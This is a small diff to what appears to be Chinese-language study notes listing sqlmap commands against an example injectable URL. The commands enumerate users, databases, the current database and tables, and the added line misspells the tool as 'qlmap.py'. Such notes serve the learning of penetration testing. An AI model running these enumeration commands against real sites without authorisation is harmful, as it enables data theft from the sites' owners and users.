@@ -11,6 +11,7 @@
 
 ```python
     URL 形如 "http://172.16.12.2/inject.php?id=1"
+    qlmap.py -u "URL" --users                --users: 查看当前用户
     sqlmap.py -u "URL" --dbs                --dbs: 列举数据库
     sqlmap.py -u "URL" --current-db         --current-db: 当前数据库
     sqlmap.py -u "URL" -D dbname  --tables              dbname:指定数据库名称 --tables:列出某数据库上的所有表
